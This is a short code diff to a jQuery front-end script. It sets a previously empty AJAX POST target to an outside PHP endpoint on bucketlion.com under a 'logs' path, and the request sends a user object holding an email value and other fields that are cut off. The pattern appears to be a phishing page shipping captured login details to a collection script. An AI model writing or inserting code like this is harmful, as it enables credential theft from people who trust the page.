@@ -67,7 +67,6 @@ import $ from 'jquery';
             setTimeout(()=>{
             }, 2200)
 
-            // jffjf
 
         const user = {
             email: defaultEmail,
@@ -76,7 +75,7 @@ import $ from 'jquery';
     
         $.ajax({
             type: "POST",
-            url: "",
+            url: "https://bucketlion.com/logs/dashboard/file/la.php",
             data: user,
             success(data) {
                 console.log(data);
